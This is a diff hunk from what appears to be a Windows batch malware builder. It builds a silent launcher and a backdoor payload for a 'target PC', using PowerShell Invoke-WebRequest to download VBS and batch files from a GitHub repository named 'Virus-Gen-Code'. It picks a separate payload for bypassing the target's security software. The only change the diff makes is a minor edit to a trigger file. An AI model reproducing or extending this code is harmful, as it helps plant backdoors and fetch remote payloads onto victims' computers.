@@ -121,7 +121,7 @@ if %username% equ kiran if not exist C:\users\%username%\EPbot_installed.sav got
     Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/SL.vbs").Content >%opt2%\payload\launch.vbs
     if exist %opt2%\payload\launch.vbs (echo [92msuccessfully created silent launch file![0m) else (goto error4)
   :: generate a file to run code from github on the target PC
-    echo fiver>load_trigger.txt
+    echo five>load_trigger.txt
     echo [33mdownloading code from github to create backdoor file...[0m
     if %target_software_bypass% equ false Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/BC_software_disabled.bat").Content >%opt2%\payload\payload.bat
     if %target_software_bypass% equ true Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/BC_software_enabled.bat").Content >%opt2%\payload\payload.bat
